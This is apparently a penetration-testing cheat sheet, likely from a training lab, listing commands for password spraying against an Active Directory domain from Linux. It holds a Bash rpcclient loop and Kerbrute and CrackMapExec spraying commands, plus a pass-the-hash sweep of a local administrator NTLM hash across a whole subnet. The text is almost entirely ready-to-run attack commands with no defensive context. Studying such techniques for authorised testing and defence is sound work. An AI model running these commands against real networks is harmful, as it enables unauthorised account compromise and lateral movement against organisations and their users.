Internal Password Spraying - from Linux

Using a Bash one-liner for the Attack
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Using Kerbrute for the Attack
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

Using CrackMapExec & Filtering Logon Failures
```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

Validating the Credentials with CrackMapExec
```shell
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

Local Admin Spraying with CrackMapExec
```shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```














